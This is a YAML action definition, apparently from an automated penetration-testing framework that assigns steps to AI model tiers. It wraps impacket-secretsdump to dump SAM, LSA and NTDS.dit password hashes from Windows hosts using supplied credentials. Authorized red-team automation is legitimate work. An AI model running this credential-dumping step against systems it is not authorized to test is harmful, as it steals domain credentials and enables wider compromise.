name: secretsdump
category: ad
description: Dump SAM/LSA/NTDS secrets from DC or workstation
preconditions:
- has_cred
- os==windows
parameters:
  target_ip: from_engagement.target_ip
  domain: from_engagement.domain
  username: from_cred.username
  password: from_cred.password
command_template: impacket-secretsdump '{domain}/{username}:{password}@{target_ip}'
parser: impacket_parser
expected_effects:
- hashes_dumped
- ntlm_hashes_obtained
falsifier:
  pattern: ACCESS_DENIED|LOGON_FAILURE|STATUS_NOT_SUPPORTED|error
  timeout: 120
model_tier: haiku
mechanism: 'Uses DRSUAPI (DC) or remote registry (workstation) to dump credentials. From DC: full NTDS.dit hashes. From workstation:
  SAM hashes + cached domain creds + LSA secrets. Requires admin rights on target.'
hacktricks_ref: windows-hardening/stealing-credentials/README.md
references:
  ocd_mindmap_node_ids:
